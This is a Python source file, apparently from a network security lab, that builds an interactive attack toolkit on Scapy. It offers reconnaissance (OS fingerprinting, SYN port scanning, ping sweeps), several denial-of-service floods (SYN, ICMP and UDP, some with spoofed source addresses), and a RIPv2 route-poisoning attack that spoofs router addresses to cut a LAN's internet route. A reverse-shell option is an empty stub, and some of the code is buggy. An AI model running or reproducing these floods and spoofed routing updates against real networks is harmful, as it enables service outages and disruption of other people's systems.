from scapy.all import *
import os
import sys
import argparse
import urllib.request
from ipaddress import IPv4Network
from tqdm import tqdm


def os_detection():
    print("Insert target IP address: ")
    target = input()
    packet = IP(dst = target) / TCP(flags = "")
    res = sr1(packet, timeout = 5, verbose = 0)

    if res is None:
	#check if ICMP is blocked
        packet = IP(dst = target) / ICMP()
        res1 = sr1(packet, timeout = 5, verbose = 0)
        if res1 is None:
            print("Host is down")
        else:
             print("OS is Linux")
    else:
         if IP in res:
            if res.getlayer(IP).ttl <= 64:
                print("The packet's TTL is " + str(res.getlayer(IP).ttl))
                print("OS is Linux")
            else:
                print("The packet's TTL is " + str(res.getlayer(IP).ttl))
                print("OS is Windows")
    
    print("Click enter to continue...")
    input()

def port_scanner():

    print("Insert target IP address: ")
    target = input()

    src_port = RandShort()
    ports_list = [20, 21, 22, 23, 25, 53, 69, 80, 110, 143, 161, 162, 443, 989, 990]
    #20: FTP, 21: FTP, 22: SSH, 23: Telnet, 25: SMTP, 53: DNS, 69: TFTP, 80: HTTP, 110: POP3, 143: IMAP, 161: SNMP, 162: SNMP, 443: HTTPS, 989: FTPS, 990: FTPS

    for port in ports_list:

        tcp_connect_scan_resp = sr1(IP(dst = target)/TCP(sport = src_port, dport = port, flags = "S"), timeout=2, verbose = 0)

        if(type(tcp_connect_scan_resp) is None):
            pass
        elif(tcp_connect_scan_resp.haslayer(TCP)):
            if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
                send_rst = sr(IP(dst = target)/TCP(sport = src_port, dport = port, flags = "AR"), timeout=2, verbose = 0)
                print ("Port " + str(port) + " is open")
        elif (tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
            pass
    print("Click enter to continue...")
    input()

def ip_sweep():

    # Defines network to analyze
    print("Insert the network address to scan (The format should be xxx.xxx.xxx.xxx/xx):")
    network = input()

    print("Analyzing hosts in network " + network)

    addresses = IPv4Network(network)
    # Send ICMP ping request, wait for answer
    for j in range (0, 100):
        #sr1() is a function that generates and sends packets and assigns to a variable a certain state 
        #depending from the fact that the packet/s sent did/did not receive an answer.
        resp = sr1(IP(dst=str(addresses[j]))/ICMP(), timeout=0.01, verbose = 0)
        if resp is None:
            pass
        else:
            print(f"{addresses[j]} is responding.")
    
    print("Click enter to continue...")
    input()

def ip_spoof():
    # Simple version
    print("Insert target IP address: ")
    target = input()
    numPackets = int(input("Insert the number of packets to send: "))

    print("Sending...")

    for i in tqdm(range (numPackets)):
        packet = IP(src = RandShort(), dst = target)/ICMP()/"whoamI"
        send(packet, verbose=False)

    print("\n")
    print(str(numPackets) + " spoofed packets have been sent to " + str(target) + ".")
    print("\n")
    
    print("Click enter to continue...")
    input()

def syn_flood():
    print("Insert target IP address: ")
    target = input()
    print("Attacking " + target + " with SYN flood.")

    def flood():
        packet = (IP(dst=target) / TCP(dport=139, flags="S") / ("payloadpayloadpayload")
        )
        send(packet, inter=0.000001, loop=1)


    t1 = threading.Thread(target=flood())
    t2 = threading.Thread(target=flood())
    t3 = threading.Thread(target=flood())
    t4 = threading.Thread(target=flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()

def spoofed_syn_flood():

    print("Insert target IP address: ")
    target = input()
    print("Attacking " + target + " with SPOOFED SYN flood.")

    def spoofed_flood():
        packet = IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / \
            TCP(dport=139, flags="S") / ("payloadpayloadpayload")
        send(packet, inter=0.000001, loop=1)

    t1 = threading.Thread(target=spoofed_flood())
    t2 = threading.Thread(target=spoofed_flood())
    t3 = threading.Thread(target=spoofed_flood())
    t4 = threading.Thread(target=spoofed_flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()

def icmp_flood():
    
    print("Insert target IP address: ")
    target = input()    
    print("Attacking " + target + " with ICMP flood.")

    def flood():
        packet = IP(dst=target)/ICMP()/"random_payload"
        send(packet, inter=0.00001, loop=1)


    t1 = threading.Thread(target=flood())
    t2 = threading.Thread(target=flood())
    t3 = threading.Thread(target=flood())
    t4 = threading.Thread(target=flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()

def spoofed_icmp_flood():
    print("Insert target IP address: ")
    target = input()
    print("Attacking " + target + " with ICMP flood.")


    def spoofed_flood():
        packet = packet = IP(src="192.168.222." + str(random.randint(2, 253)), dst=target) / \
            ICMP()/"random_payload"
        send(packet, inter=0.000001, loop=1)


    t1 = threading.Thread(target=spoofed_flood())
    t2 = threading.Thread(target=spoofed_flood())
    t3 = threading.Thread(target=spoofed_flood())
    t4 = threading.Thread(target=spoofed_flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()

def spoofed_udp_flood():

    print("Insert target IP address: ")
    target = input()

    print("Starting UDP flood attack towards " + target + " ...")

    def spoofed_flood():
        try:
            packet = IP(src=str(RandIP()), dst=target) / \
                UDP(dport=RandShort()) / ("X" * RandByte())
            send(packet, verbose=1, loop=1, inter=0.0000001)
        except KeyboardInterrupt as e:
            sys.exit(1)


    t1 = threading.Thread(target=spoofed_flood())
    t2 = threading.Thread(target=spoofed_flood())
    t3 = threading.Thread(target=spoofed_flood())
    t4 = threading.Thread(target=spoofed_flood())

    t1.start()
    t2.start()
    t3.start()
    t4.start()

def icmp_reverse_shell():
    return 0

def RIP_attack():

    address = "192.168.220.0" #hop to Firewall and thus to Internet
    
    target_1 = "192.168.220.30" # target 1 -> R5 can be reached by R1 via R2
    target_2 = "192.168.220.40" # target 2 -> R5 can be reached by R1 via R4
	
    target_list = [target_1, target_2]

    packet_list = []
    for target in target_list:
	
	#define headers
        IP_header = IP(src=target, dst="224.0.0.9", ttl=1) #multicast address for RIPv2
        UDP_header = UDP(sport=520, dport=520)
        RIP_header = RIP(cmd=2, version=2)
        RIPEntry = RIPEntry(addr=address, mask="255.255.255.0", metric=16)
	
        #define the packet
        packet = IP_header / UDP_header / RIP_header / RIPEntry
	
	#append to list to be sent
        packet_list.append(packet)
    
    #loop the sending
    while True:
        for packet in packet_list:
            send(packet, inter=0.0005)

def choose_recon():
    #clear the screen
    os.system("clear")
    print("\n")
    print("------------------------------------------------------------------------------------")
    string = '''/  __\\/  __//   _\\/  _ \\/ \\  /|/ \\  /|/  _ \\/ \\/ ___\\/ ___\\/  _ \\/ \\  /|/   _\\/  __/
|  \\/||  \\  |  /  | / \\|| |\\ ||| |\\ ||| / \\|| ||    \\|    \\| / \\|| |\\ |||  /  |  \\  
|    /|  /_ |  \\_ | \\_/|| | \\||| | \\||| |-||| |\\___ |\\___ || |-||| | \\|||  \\_ |  /_ 
\\_/\\_\\\\____\\\\____/\\____/\\_/  \\|\\_/  \\|\\_/ \\|\\_/\\____/\\____/\\_/ \\|\\_/  \\|\\____/\\____\\'''

    print(string)
    print("------------------------------------------------------------------------------------")
    print("\n")
    print("Choose a reconnaissance attack.")
    print("1. OS Detection")
    print("2. Port Scanning")
    print("3. Ip Spoof Testing")
    print("4. Active Hosts in Network")
    print("5. Exit")
    print("------------------------------------------------------------------------------------")
    choice = input("Enter your choice: ")
    if choice == "1":
        os_detection()
        choose_recon()
    elif choice == "2":
        port_scanner()
        choose_recon()
    elif choice == "3":
        ip_spoof()
        choose_recon()
    elif choice == "4":
        ip_sweep()
        choose_recon()
    elif choice == "5":
        print("Back to main menu.")
        os.system("clear")
        main()
    else:
        print("Invalid choice. Try again.")
        choose_recon()

def choose_dos():
    os.system("clear")
    print("-----------------------------------------------------------------------------------------")
    string = '''/  _ \\/  __// \\  /|/ \\/  _ \\/ \\     /  _ \\/    /  / ___\\/  __//  __\\/ \\ |\\/ \\/   _\\/  __/
| | \\||  \\  | |\\ ||| || / \\|| |     | / \\||  __\\  |    \\|  \\  |  \\/|| | //| ||  /  |  \\  
| |_\\||  /_ | | \\||| || |-||| |_/\  | \\_/|| |     \\___ ||  /_ |    /| \\// | ||  \\_ |  /_ 
\\____/\\____\\\\_/  \\|\\_/\\_/ \\|\\____/  \\____/\\_/     \\____/\\____\\\\_/\\_\\\\__/  \\_/\\____/\\____/'''

    print(string)
    print("-----------------------------------------------------------------------------------------")
    print("\n")
    print("Choose a denial of service attack.")
    print("1. SYN Flood")
    print("2. Spoofed SYN Flood")
    print("3. ICMP Flood")
    print("4. Spoofed ICMP Flood")
    print("5. Spoofed UDP Flood")
    print("6. Exit")                                            
    print("-----------------------------------------------------------------------------------------")
    choice = input("Enter your choice: ")
    if choice == "1":
        syn_flood()
        choose_dos()
    elif choice == "2":
        spoofed_syn_flood()
        choose_dos()
    elif choice == "3":
        icmp_flood()
        choose_dos()
    elif choice == "4":
        spoofed_icmp_flood()
        choose_dos()
    elif choice == "5":
        spoofed_udp_flood()
        choose_dos()
    elif choice == "6":
        print("Back to main menu.")
        os.system("clear")
        main()
    else:
        print("Invalid choice. Try again.")
        choose_dos()

def choose_exploit():
    os.system("clear")                                   
    print("----------------------------------------------")
    string = ''' ________  _ ____  _     ____  _  _____  ____ 
/  __/\\  \///  __\\/ \\   /  _ \\/ \\/__ __\\/ ___\\
|  \\   \\  / |  \\/|| |   | / \\|| |  / \\  |    \\
|  /_  /  \\ |  __/| |_/\| \\_/|| |  | |  \\___ |
\\____\\/__/\\\\\\_/   \\____/\\____/\\_/  \\_/  \\____/'''

    print(string)
    print("----------------------------------------------")
    print("\n")
    print("Choose an exploit.")
    print("1. ICMP Reverse Shell")
    print("2. RIP Attack on the LAN access to the Internet")
    print("3. Exit")
    print("----------------------------------------------")
    choice = input("Enter your choice: ")
    if choice == "1":
        icmp_reverse_shell()
    elif choice == "2":
        RIP_attack()
    elif choice == "3":
        print("Back to main menu.")
        os.system("clear")
        main()
    else:
        print("Invalid choice. Try again.")
        choose_exploit()

def main():
    os.system("clear")
    while True:
        print("-----------------------------------")
        print("Welcome. Choose a category of attacks.")
        print("1. Reconnaissance")
        print("2. Denial of Service")
        print("3. Exploits")
        print("4. Exit")
        print("-----------------------------------")
        choice = input("Enter your choice: ")
        if choice == "1":
            choose_recon()
        elif choice == "2":
            choose_dos()
        elif choice == "3":
            choose_exploit()
        elif choice == "4":
            print("Goodbye!")
            sys.exit()
        else:
            print("Invalid choice. Try again.")
            main()

if __name__ == "__main__":
    main()